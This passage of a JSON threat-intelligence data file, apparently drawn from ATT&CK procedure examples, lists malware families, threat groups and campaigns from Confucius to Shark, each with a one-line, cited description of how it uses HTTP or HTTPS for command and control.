                        "Description": "<name> has used HTTP requests for command and control.[81][82][83]"
                    },
                    "G0142": {
                        "ID": "G0142",
                        "Name": "Confucius",
                        "Description": "<name> has used HTTP for C2 communications.[84]"
                    },
                    "S0137": {
                        "ID": "S0137",
                        "Name": "CORESHELL",
                        "Description": "<name> can communicate over HTTP for C2.[19][85]"
                    },
                    "S0050": {
                        "ID": "S0050",
                        "Name": "CosmicDuke",
                        "Description": "<name> can use HTTP or HTTPS for command and control to hard-coded C2 servers.[70][86]"
                    },
                    "S0046": {
                        "ID": "S0046",
                        "Name": "CozyCar",
                        "Description": "<name>'s main method of communicating with its C2 servers is using HTTP or HTTPS.[87]"
                    },
                    "S1023": {
                        "ID": "S1023",
                        "Name": "CreepyDrive",
                        "Description": "<name> can use HTTPS for C2 using the Microsoft Graph API.[88]"
                    },
                    "S1024": {
                        "ID": "S1024",
                        "Name": "CreepySnail",
                        "Description": "<name> can use HTTP for C2.[88]"
                    },
                    "S0115": {
                        "ID": "S0115",
                        "Name": "Crimson",
                        "Description": "<name> can use a HTTP GET request to download its final payload.[89]"
                    },
                    "S0538": {
                        "ID": "S0538",
                        "Name": "Crutch",
                        "Description": "<name> has conducted C2 communications with a Dropbox account using the HTTP API.[90]"
                    },
                    "S0527": {
                        "ID": "S0527",
                        "Name": "CSPY Downloader",
                        "Description": "<name> can use GET requests to download additional payloads from C2.[91]"
                    },
                    "S0687": {
                        "ID": "S0687",
                        "Name": "Cyclops Blink",
                        "Description": "<name> can download files via HTTP and HTTPS.[92][93]"
                    },
                    "S0497": {
                        "ID": "S0497",
                        "Name": "Dacls",
                        "Description": "<name> can use HTTPS in C2 communications.[94][95]"
                    },
                    "S1014": {
                        "ID": "S1014",
                        "Name": "DanBot",
                        "Description": "<name> can use HTTP in C2 communication.[96]"
                    },
                    "G0070": {
                        "ID": "G0070",
                        "Name": "Dark Caracal",
                        "Description": "<name>'s version of Bandook communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string \"&&&\".[97]"
                    },
                    "S0334": {
                        "ID": "S0334",
                        "Name": "DarkComet",
                        "Description": "<name> can use HTTP for C2 communications.[98]"
                    },
                    "S1066": {
                        "ID": "S1066",
                        "Name": "DarkTortilla",
                        "Description": "<name> has used HTTP and HTTPS for C2.[99]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> uses HTTPS for command and control.[100]"
                    },
                    "S0187": {
                        "ID": "S0187",
                        "Name": "Daserf",
                        "Description": "<name> uses HTTP for C2.[50]"
                    },
                    "S0243": {
                        "ID": "S0243",
                        "Name": "DealersChoice",
                        "Description": "<name> uses HTTP for communication with the C2 server.[101]"
                    },
                    "S0616": {
                        "ID": "S0616",
                        "Name": "DEATHRANSOM",
                        "Description": "<name> can use HTTPS to download files.[102]"
                    },
                    "S0659": {
                        "ID": "S0659",
                        "Name": "Diavol",
                        "Description": "<name> has used HTTP GET and POST requests for C2.[103]"
                    },
                    "S0200": {
                        "ID": "S0200",
                        "Name": "Dipsind",
                        "Description": "<name> uses HTTP for C2.[104]"
                    },
                    "S0600": {
                        "ID": "S0600",
                        "Name": "Doki",
                        "Description": "<name> has communicated with C2 over HTTPS.[105]"
                    },
                    "S0695": {
                        "ID": "S0695",
                        "Name": "Donut",
                        "Description": "<name> can use HTTP to download previously staged shellcode payloads.[106]"
                    },
                    "S0472": {
                        "ID": "S0472",
                        "Name": "down_new",
                        "Description": "<name> has the ability to use HTTP in C2 communications.[4]"
                    },
                    "S0186": {
                        "ID": "S0186",
                        "Name": "DownPaper",
                        "Description": "<name> communicates to its C2 server over HTTP.[107]"
                    },
                    "S0694": {
                        "ID": "S0694",
                        "Name": "DRATzarus",
                        "Description": "<name> can use HTTP or HTTPS for C2 communications.[108]"
                    },
                    "S0384": {
                        "ID": "S0384",
                        "Name": "Dridex",
                        "Description": "<name> has used POST requests and HTTPS for C2 communications.[109][110]"
                    },
                    "S0502": {
                        "ID": "S0502",
                        "Name": "Drovorub",
                        "Description": "<name> can use the WebSocket protocol and has initiated communication with C2 servers with an HTTP Upgrade request.[111]"
                    },
                    "S0062": {
                        "ID": "S0062",
                        "Name": "DustySky",
                        "Description": "<name> has used both HTTP and HTTPS for C2.[112]"
                    },
                    "S0024": {
                        "ID": "S0024",
                        "Name": "Dyre",
                        "Description": "<name> uses HTTPS for C2 communications.[113][114]"
                    },
                    "S0554": {
                        "ID": "S0554",
                        "Name": "Egregor",
                        "Description": "<name> has communicated with its C2 servers via HTTPS protocol.[115]"
                    },
                    "S0081": {
                        "ID": "S0081",
                        "Name": "Elise",
                        "Description": "<name> communicates over HTTP or HTTPS for C2.[116]"
                    },
                    "S0064": {
                        "ID": "S0064",
                        "Name": "ELMER",
                        "Description": "<name> uses HTTP for command and control.[117]"
                    },
                    "S0082": {
                        "ID": "S0082",
                        "Name": "Emissary",
                        "Description": "<name> uses HTTP or HTTPS for C2.[118]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has used HTTP for command and control.[119]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can conduct command and control over protocols like HTTP and HTTPS.[120]"
                    },
                    "S0091": {
                        "ID": "S0091",
                        "Name": "Epic",
                        "Description": "<name> uses HTTP and HTTPS for C2 communications.[121][122]"
                    },
                    "S0396": {
                        "ID": "S0396",
                        "Name": "EvilBunny",
                        "Description": "<name> has executed C2 commands directly via HTTP.[123]"
                    },
                    "S0401": {
                        "ID": "S0401",
                        "Name": "Exaramel for Linux",
                        "Description": "<name> uses HTTPS for C2 communications.[124][125]"
                    },
                    "S0569": {
                        "ID": "S0569",
                        "Name": "Explosive",
                        "Description": "<name> has used HTTP for communication.[126]"
                    },
                    "S0512": {
                        "ID": "S0512",
                        "Name": "FatDuke",
                        "Description": "<name> can be controlled via a custom C2 protocol over HTTP.[127]"
                    },
                    "S0171": {
                        "ID": "S0171",
                        "Name": "Felismus",
                        "Description": "<name> uses HTTP for C2.[128]"
                    },
                    "S0267": {
                        "ID": "S0267",
                        "Name": "FELIXROOT",
                        "Description": "<name> uses HTTP and HTTPS to communicate with the C2 server.[129][130]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has used HTTP requests to chain multiple web shells and to contact actor-controlled C2 servers prior to exfiltrating stolen data.[131][132]"
                    },
                    "G0085": {
                        "ID": "G0085",
                        "Name": "FIN4",
                        "Description": "<name> has used HTTP POST requests to transmit data.[133][134]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used HTTPS for command and control.[135]"
                    },
                    "S0355": {
                        "ID": "S0355",
                        "Name": "Final1stspy",
                        "Description": "<name> uses HTTP for C2.[136]"
                    },
                    "S0696": {
                        "ID": "S0696",
                        "Name": "Flagpro",
                        "Description": "<name> can communicate with its C2 using HTTP.[137]"
                    },
                    "S0381": {
                        "ID": "S0381",
                        "Name": "FlawedAmmyy",
                        "Description": "<name> has used HTTP for C2.[138]"
                    },
                    "S0661": {
                        "ID": "S0661",
                        "Name": "FoggyWeb",
                        "Description": "<name> has the ability to communicate with C2 servers over HTTP GET/POST requests.[139]"
                    },
                    "S1120": {
                        "ID": "S1120",
                        "Name": "FRAMESTING",
                        "Description": "<name> can retrieve C2 commands from values stored in the DSID cookie from the current HTTP request or from decompressed zlib data within the request's POST data.[140]"
                    },
                    "C0001": {
                        "ID": "C0001",
                        "Name": "Frankenstein",
                        "Description": "During <name>, the threat actors used HTTP GET requests for C2.[141]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has used HTTP and HTTPS for C2 communications.[142][143][144][145][146][147]"
                    },
                    "S0168": {
                        "ID": "S0168",
                        "Name": "Gazer",
                        "Description": "<name> communicates with its C2 servers over HTTP.[148]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> can use HTTP/S in C2 communications.[149]"
                    },
                    "S0049": {
                        "ID": "S0049",
                        "Name": "GeminiDuke",
                        "Description": "<name> uses HTTP and HTTPS for command and control.[70]"
                    },
                    "S0460": {
                        "ID": "S0460",
                        "Name": "Get2",
                        "Description": "<name> has the ability to use HTTP to send information collected from an infected host to C2.[150]"
                    },
                    "S0249": {
                        "ID": "S0249",
                        "Name": "Gold Dragon",
                        "Description": "<name> uses HTTP for communication to the control servers.[151]"
                    },
                    "S0493": {
                        "ID": "S0493",
                        "Name": "GoldenSpy",
                        "Description": "<name> has used the Ryeol HTTP Client to facilitate HTTP internet communication.[152]"
                    },
                    "S0597": {
                        "ID": "S0597",
                        "Name": "GoldFinder",
                        "Description": "<name> has used HTTP for C2.[153]"
                    },
                    "S0588": {
                        "ID": "S0588",
                        "Name": "GoldMax",
                        "Description": "<name> has used HTTPS and HTTP GET requests with custom HTTP cookies for C2.[153][154]"
                    },
                    "S0477": {
                        "ID": "S0477",
                        "Name": "Goopy",
                        "Description": "<name> has the ability to communicate with its C2 over HTTP.[22]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> has the ability to use HTTP in C2 communications.[155][156]"
                    },
                    "S0237": {
                        "ID": "S0237",
                        "Name": "GravityRAT",
                        "Description": "<name> uses HTTP for C2.[157]"
                    },
                    "S0342": {
                        "ID": "S0342",
                        "Name": "GreyEnergy",
                        "Description": "<name> uses HTTP and HTTPS for C2 communications.[130]"
                    },
                    "S0632": {
                        "ID": "S0632",
                        "Name": "GrimAgent",
                        "Description": "<name> has the ability to use HTTP for C2 communications.[158]"
                    },
                    "S0561": {
                        "ID": "S0561",
                        "Name": "GuLoader",
                        "Description": "<name> can use HTTP to retrieve additional binaries.[159][160]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has used open-source C2 frameworks, including Covenant.[161]"
                    },
                    "S0037": {
                        "ID": "S0037",
                        "Name": "HAMMERTOSS",
                        "Description": "The \"Uploader\" variant of <name> visits a hard-coded server over HTTP/S to download the images <name> uses to receive commands.[162]"
                    },
                    "S0391": {
                        "ID": "S0391",
                        "Name": "HAWKBALL",
                        "Description": "<name> has used HTTP to communicate with a single hard-coded C2 server.[163]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "<name> can use HTTP for C2.[164]"
                    },
                    "S0087": {
                        "ID": "S0087",
                        "Name": "Hi-Zor",
                        "Description": "<name> communicates with its C2 server over HTTPS.[165]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name> used HTTP and HTTPS to send data back to its C2 server.[166][167]"
                    },
                    "S0009": {
                        "ID": "S0009",
                        "Name": "Hikit",
                        "Description": "<name> has used HTTP for C2.[168]"
                    },
                    "S0070": {
                        "ID": "S0070",
                        "Name": "HTTPBrowser",
                        "Description": "<name> has used HTTP and HTTPS for command and control.[169][170]"
                    },
                    "S0068": {
                        "ID": "S0068",
                        "Name": "httpclient",
                        "Description": "<name> uses HTTP for command and control.[1]"
                    },
                    "S0398": {
                        "ID": "S0398",
                        "Name": "HyperBro",
                        "Description": "<name> has used HTTPS for C2 communications.[171]"
                    },
                    "S1022": {
                        "ID": "S1022",
                        "Name": "IceApple",
                        "Description": "<name> can use HTTP GET to request and pull information from C2.[172]"
                    },
                    "S0483": {
                        "ID": "S0483",
                        "Name": "IcedID",
                        "Description": "<name> has used HTTPS in communications with C2.[173]"
                    },
                    "G0100": {
                        "ID": "G0100",
                        "Name": "Inception",
                        "Description": "<name> has used HTTP, HTTPS, and WebDav in network communications.[174][175]"
                    },
                    "S0604": {
                        "ID": "S0604",
                        "Name": "Industroyer",
                        "Description": "<name>\u2019s main backdoor connected to a remote C2 server using HTTPS.[176]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> uses HTTP for C2 communications.[177]"
                    },
                    "S0015": {
                        "ID": "S0015",
                        "Name": "Ixeshe",
                        "Description": "<name> uses HTTP for command and control.[178][179]"
                    },
                    "S0044": {
                        "ID": "S0044",
                        "Name": "JHUHUGIT",
                        "Description": "<name> variants have communicated with C2 servers over HTTP and HTTPS.[180][181][182]"
                    },
                    "S0265": {
                        "ID": "S0265",
                        "Name": "Kazuar",
                        "Description": "<name> uses HTTP and HTTPS to communicate with the C2 server. <name> can also act as a webserver and listen for inbound HTTP requests through an exposed API.[183]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> malware including RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2.[184][185]"
                    },
                    "S1020": {
                        "ID": "S1020",
                        "Name": "Kevin",
                        "Description": "Variants of <name> can communicate with C2 over HTTP.[186]"
                    },
                    "S0276": {
                        "ID": "S0276",
                        "Name": "Keydnap",
                        "Description": "<name> uses HTTPS for command and control.[187]"
                    },
                    "S1051": {
                        "ID": "S1051",
                        "Name": "KEYPLUG",
                        "Description": "<name> has the ability to communicate over HTTP and WebSocket Protocol (WSS) for C2.[55]"
                    },
                    "S0526": {
                        "ID": "S0526",
                        "Name": "KGH_SPY",
                        "Description": "<name> can send data to C2 with HTTP POST requests.[91]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name>  has used HTTP GET and POST requests for C2.[188]"
                    },
                    "S0599": {
                        "ID": "S0599",
                        "Name": "Kinsing",
                        "Description": "<name> has communicated with C2 over HTTP.[189]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> has used HTTP for C2 communications.[190]"
                    },
                    "S0162": {
                        "ID": "S0162",
                        "Name": "Komplex",
                        "Description": "The <name> C2 channel uses HTTP POST requests.[191]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has used HTTP POST for C2.[192][193]"
                    },
                    "S1075": {
                        "ID": "S1075",
                        "Name": "KOPILUWAK",
                        "Description": "<name> has used HTTP POST requests to send data to C2.[11]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has conducted C2 over HTTP and HTTPS.[194][94][95][195][196][197]"
                    },
                    "S1119": {
                        "ID": "S1119",
                        "Name": "LIGHTWIRE",
                        "Description": "<name> can use HTTP for C2 communications.[140]"
                    },
                    "S0513": {
                        "ID": "S0513",
                        "Name": "LiteDuke",
                        "Description": "<name> can use HTTP GET requests in C2 communications.[127]"
                    },
                    "S0680": {
                        "ID": "S0680",
                        "Name": "LitePower",
                        "Description": "<name> can use HTTP and HTTPS for C2 communications.[198]"
                    },
                    "S0447": {
                        "ID": "S0447",
                        "Name": "Lokibot",
                        "Description": "<name> has used HTTP for C2 communications.[199][200]"
                    },
                    "S0582": {
                        "ID": "S0582",
                        "Name": "LookBack",
                        "Description": "<name>\u2019s C2 proxy tool sends data to a C2 server over HTTP.[201]"
                    },
                    "S0042": {
                        "ID": "S0042",
                        "Name": "LOWBALL",
                        "Description": "<name> command and control occurs via HTTPS over port 443.[53]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has used HTTP for C2.[202]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> uses HTTP for Command & Control.[203][204][205]"
                    },
                    "S0282": {
                        "ID": "S0282",
                        "Name": "MacSpy",
                        "Description": "<name> uses HTTP for command and control.[206]"
                    },
                    "S1060": {
                        "ID": "S1060",
                        "Name": "Mafalda",
                        "Description": "<name> can use HTTP for C2.[207]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has used HTTP for C2.[208][209][210]"
                    },
                    "S0652": {
                        "ID": "S0652",
                        "Name": "MarkiRAT",
                        "Description": "<name> can initiate communication over HTTP/HTTPS for its C2 server.[211]"
                    },
                    "S0449": {
                        "ID": "S0449",
                        "Name": "Maze",
                        "Description": "<name> has communicated to hard-coded IP addresses via HTTP.[212]"
                    },
                    "S0500": {
                        "ID": "S0500",
                        "Name": "MCMD",
                        "Description": "<name> can use HTTPS in communication with C2 web servers.[213]"
                    },
                    "S0459": {
                        "ID": "S0459",
                        "Name": "MechaFlounder",
                        "Description": "<name> has the ability to use HTTP in communication with C2.[214]"
                    },
                    "G1013": {
                        "ID": "G1013",
                        "Name": "Metador",
                        "Description": "<name> has used HTTP for C2.[207]"
                    },
                    "S1059": {
                        "ID": "S1059",
                        "Name": "metaMain",
                        "Description": "<name> can use HTTP for C2 communications.[207][215]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has used HTTP for C2.[216][217]"
                    },
                    "S0339": {
                        "ID": "S0339",
                        "Name": "Micropsia",
                        "Description": "<name> uses HTTP and HTTPS for C2 network communications.[218][219]"
                    },
                    "S1015": {
                        "ID": "S1015",
                        "Name": "Milan",
                        "Description": "<name> can use HTTPS for communication with C2.[220][186][221]"
                    },
                    "S0051": {
                        "ID": "S0051",
                        "Name": "MiniDuke",
                        "Description": "<name> uses HTTP and HTTPS for command and control.[70][127]"
                    },
                    "S0084": {
                        "ID": "S0084",
                        "Name": "Mis-Type",
                        "Description": "<name> network traffic can communicate over HTTP.[222]"
                    },
                    "S1026": {
                        "ID": "S1026",
                        "Name": "Mongall",
                        "Description": "<name> can use HTTP for C2 communication.[223]"
                    },
                    "S0284": {
                        "ID": "S0284",
                        "Name": "More_eggs",
                        "Description": "<name> uses HTTPS for C2.[72][224]"
                    },
                    "S1047": {
                        "ID": "S1047",
                        "Name": "Mori",
                        "Description": "<name> can communicate using HTTP over IPv4 or IPv6 depending on a flag set.[225]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used HTTP for C2 communications.[226][227]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has communicated with its C2 via HTTP POST requests.[228][229][230][231]"
                    },
                    "S0699": {
                        "ID": "S0699",
                        "Name": "Mythic",
                        "Description": "<name> supports HTTP-based C2 profiles.[232]"
                    },
                    "S0691": {
                        "ID": "S0691",
                        "Name": "Neoichor",
                        "Description": "<name> can use HTTP for C2 communications.[185]"
                    },
                    "S0034": {
                        "ID": "S0034",
                        "Name": "NETEAGLE",
                        "Description": "<name> will attempt to detect if the infected host is configured to a proxy. If so, <name> will send beacons via an HTTP POST request. <name> will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2.[31]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> has the ability to communicate over HTTP.[233][234]"
                    },
                    "S1106": {
                        "ID": "S1106",
                        "Name": "NGLite",
                        "Description": "<name> will initially beacon out to the NKN network via an HTTP POST over TCP 30003.[235]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors used HTTP for C2.[236]"
                    },
                    "S1100": {
                        "ID": "S1100",
                        "Name": "Ninja",
                        "Description": "<name> can use HTTP for C2 communications.[237]"
                    },
                    "S0385": {
                        "ID": "S0385",
                        "Name": "njRAT",
                        "Description": "<name> has used HTTP for C2 communications.[238]"
                    },
                    "S0353": {
                        "ID": "S0353",
                        "Name": "NOKKI",
                        "Description": "<name> has used HTTP for C2 communications.[239]"
                    },
                    "S0340": {
                        "ID": "S0340",
                        "Name": "Octopus",
                        "Description": "<name> has used HTTP GET and POST requests for C2 communications.[240][241]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used HTTP for C2.[242][243][244]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name> uses HTTP for communication with its C2.[245]"
                    },
                    "S0138": {
                        "ID": "S0138",
                        "Name": "OLDBAIT",
                        "Description": "<name> can use HTTP for C2.[19]"
                    },
                    "S0052": {
                        "ID": "S0052",
                        "Name": "OnionDuke",
                        "Description": "<name> uses HTTP and HTTPS for C2.[70]"
                    },
                    "S0264": {
                        "ID": "S0264",
                        "Name": "OopsIE",
                        "Description": "<name> uses HTTP for C2 communications.[246][247]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors enabled HTTP and HTTPS listeners.[248]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group uses HTTP and HTTPS to contact actor-controlled C2 servers.[249]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors\u2019 XServer tool communicated using HTTP and HTTPS.[250]"
                    },
                    "G0071": {
                        "ID": "G0071",
                        "Name": "Orangeworm",
                        "Description": "<name> has used HTTP for C2.[251]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> can also use use HTTP POST and GET requests to send and receive C2 information.[252]"
                    },
                    "S0594": {
                        "ID": "S0594",
                        "Name": "Out1",
                        "Description": "<name> can use HTTP and HTTPS in communications with remote hosts.[227]"
                    },
                    "S1017": {
                        "ID": "S1017",
                        "Name": "OutSteel",
                        "Description": "<name> has used HTTP for C2 communications.[253]"
                    },
                    "S0072": {
                        "ID": "S0072",
                        "Name": "OwaAuth",
                        "Description": "<name> uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.[169]"
                    },
                    "S0598": {
                        "ID": "S0598",
                        "Name": "P.A.S. Webshell",
                        "Description": "<name> can issue commands via HTTP POST.[125]"
                    },
                    "S0664": {
                        "ID": "S0664",
                        "Name": "Pandora",
                        "Description": "<name> can communicate over HTTP.[254]"
                    },
                    "S1050": {
                        "ID": "S1050",
                        "Name": "PcShare",
                        "Description": "<name> has used HTTP for C2 communication.[255]"
                    },
                    "S0643": {
                        "ID": "S0643",
                        "Name": "Peppy",
                        "Description": "<name> can use HTTP to communicate with C2.[89]"
                    },
                    "S0048": {
                        "ID": "S0048",
                        "Name": "PinchDuke",
                        "Description": "<name> transfers files from the compromised host via HTTP or HTTPS to a C2 server.[70]"
                    },
                    "S1031": {
                        "ID": "S1031",
                        "Name": "PingPull",
                        "Description": "A <name> variant can communicate with its C2 servers by using HTTPS.[256]"
                    },
                    "S0435": {
                        "ID": "S0435",
                        "Name": "PLEAD",
                        "Description": "<name> has used HTTP for communications with command and control (C2) servers.[257][258]"
                    },
                    "S0013": {
                        "ID": "S0013",
                        "Name": "PlugX",
                        "Description": "<name> can be configured to use HTTP for command and control.[169][259]"
                    },
                    "S0067": {
                        "ID": "S0067",
                        "Name": "pngdowner",
                        "Description": "<name> uses HTTP for command and control.[1]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> has used HTTP and HTTPs for C2 communications.[260]"
                    },
                    "S0518": {
                        "ID": "S0518",
                        "Name": "PolyglotDuke",
                        "Description": "<name> has has used HTTP GET requests in C2 communications.[127]"
                    },
                    "S0453": {
                        "ID": "S0453",
                        "Name": "Pony",
                        "Description": "<name> has sent collected information to the C2 via HTTP POST request.[261]"
                    },
                    "S0378": {
                        "ID": "S0378",
                        "Name": "PoshC2",
                        "Description": "<name> can use protocols like HTTP/HTTPS for command and control traffic.[262]"
                    },
                    "S0441": {
                        "ID": "S0441",
                        "Name": "PowerShower",
                        "Description": "<name> has sent HTTP GET and POST requests to C2 servers to send information and receive instructions.[175]"
                    },
                    "S0371": {
                        "ID": "S0371",
                        "Name": "POWERTON",
                        "Description": "<name> has used HTTP/HTTPS for C2 traffic.[263]"
                    },
                    "S1046": {
                        "ID": "S1046",
                        "Name": "PowGoop",
                        "Description": "<name> can send HTTP GET requests to malicious servers.[264]"
                    },
                    "S0184": {
                        "ID": "S0184",
                        "Name": "POWRUNER",
                        "Description": "<name> can use HTTP for C2 communications.[265][243]"
                    },
                    "S0238": {
                        "ID": "S0238",
                        "Name": "Proxysvc",
                        "Description": "<name> uses HTTP over SSL to communicate commands with the control server.[266]"
                    },
                    "S0078": {
                        "ID": "S0078",
                        "Name": "Psylo",
                        "Description": "<name> uses HTTPS for C2.[267]"
                    },
                    "S0147": {
                        "ID": "S0147",
                        "Name": "Pteranodon",
                        "Description": "<name> can use HTTP for C2.[142]"
                    },
                    "S1108": {
                        "ID": "S1108",
                        "Name": "PULSECHECK",
                        "Description": "<name> can check HTTP request headers for a specific backdoor key and if found will output the result of the command in the variable HTTP_X_CMD.[268]"
                    },
                    "S0196": {
                        "ID": "S0196",
                        "Name": "PUNCHBUGGY",
                        "Description": "<name> enables remote interaction and can obtain additional code over HTTPS GET and POST requests.[269][270][271]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can communicate over HTTP for C2.[272]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> has the ability to use HTTP and HTTPS in communication with C2 servers.[273][274][275]"
                    },
                    "S0269": {
                        "ID": "S0269",
                        "Name": "QUADAGENT",
                        "Description": "<name> uses HTTPS and HTTP for C2 communications.[276]"
                    },
                    "S1076": {
                        "ID": "S1076",
                        "Name": "QUIETCANARY",
                        "Description": "<name> can use HTTPS for C2 communications.[11]"
                    },
                    "S0686": {
                        "ID": "S0686",
                        "Name": "QuietSieve",
                        "Description": "<name> can use HTTPS in C2 communications.[277]"
                    },
                    "S0629": {
                        "ID": "S0629",
                        "Name": "RainyDay",
                        "Description": "<name> can use HTTP in C2 communications.[278]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> has used HTTP for C2.[279]"
                    },
                    "G0075": {
                        "ID": "G0075",
                        "Name": "Rancor",
                        "Description": "<name> has used HTTP for C2.[280]"
                    },
                    "S0241": {
                        "ID": "S0241",
                        "Name": "RATANKBA",
                        "Description": "<name> uses HTTP/HTTPS for command and control communication.[281][282]"
                    },
                    "S0662": {
                        "ID": "S0662",
                        "Name": "RCSession",
                        "Description": "<name> can use HTTP in C2 communications.[69][283]"
                    },
                    "S0495": {
                        "ID": "S0495",
                        "Name": "RDAT",
                        "Description": "<name> can use HTTP communications for C2, as well as using the WinHTTP library to make requests to the Exchange Web Services API.[284]"
                    },
                    "S0172": {
                        "ID": "S0172",
                        "Name": "Reaver",
                        "Description": "Some <name> variants use HTTP for C2.[285]"
                    },
                    "S0153": {
                        "ID": "S0153",
                        "Name": "RedLeaves",
                        "Description": "<name> can communicate to its C2 over HTTP and HTTPS if directed.[286][287]"
                    },
                    "S0019": {
                        "ID": "S0019",
                        "Name": "Regin",
                        "Description": "The <name> malware platform supports many standard protocols, including HTTP and HTTPS.[288]"
                    },
                    "S0375": {
                        "ID": "S0375",
                        "Name": "Remexi",
                        "Description": "<name> uses BITSAdmin to communicate with the C2 server over HTTP.[289]"
                    },
                    "S0125": {
                        "ID": "S0125",
                        "Name": "Remsec",
                        "Description": "<name> is capable of using HTTP and HTTPS for C2.[290][291][292]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> has used HTTP and HTTPS in communication with C2.[293][294][295][296][297]"
                    },
                    "S0258": {
                        "ID": "S0258",
                        "Name": "RGDoor",
                        "Description": "<name> uses HTTP for C2 communications.[298]"
                    },
                    "S0003": {
                        "ID": "S0003",
                        "Name": "RIPTIDE",
                        "Description": "APT12 has used <name>, a RAT that uses HTTP to communicate.[299]"
                    },
                    "S0448": {
                        "ID": "S0448",
                        "Name": "Rising Sun",
                        "Description": "<name> has used HTTP and HTTPS for command and control.[300]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> has executed wget and curl commands to Pastebin over the HTTPS protocol.[301]"
                    },
                    "S0240": {
                        "ID": "S0240",
                        "Name": "ROKRAT",
                        "Description": "<name> can use HTTP and HTTPS for command and control communication.[302][303][304]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> has initiated connections to external domains using HTTPS.[305]"
                    },
                    "S0085": {
                        "ID": "S0085",
                        "Name": "S-Type",
                        "Description": "<name> uses HTTP for C2.[222]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has used HTTP for C2 communications.[306]"
                    },
                    "S0074": {
                        "ID": "S0074",
                        "Name": "Sakula",
                        "Description": "<name> uses HTTP for C2.[307]"
                    },
                    "S1099": {
                        "ID": "S1099",
                        "Name": "Samurai",
                        "Description": "<name> can use a .NET HTTPListener class to receive and handle HTTP POST requests.[237]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name>'s BCS-server tool connects to the designated C2 server via HTTP.[308]"
                    },
                    "S0053": {
                        "ID": "S0053",
                        "Name": "SeaDuke",
                        "Description": "<name> uses HTTP and HTTPS for C2.[70]"
                    },
                    "S0345": {
                        "ID": "S0345",
                        "Name": "Seasalt",
                        "Description": "<name> uses HTTP for C2 communications.[309]"
                    },
                    "S0382": {
                        "ID": "S0382",
                        "Name": "ServHelper",
                        "Description": "<name> uses HTTP for C2.[310]"
                    },
                    "S0596": {
                        "ID": "S0596",
                        "Name": "ShadowPad",
                        "Description": "<name> communicates over HTTP to retrieve a string that is decoded into a C2 server URL.[311]"
                    },
                    "S0140": {
                        "ID": "S0140",
                        "Name": "Shamoon",
                        "Description": "<name> has used HTTP for C2.[312]"
                    },
                    "S1019": {
                        "ID": "S1019",
                        "Name": "Shark",
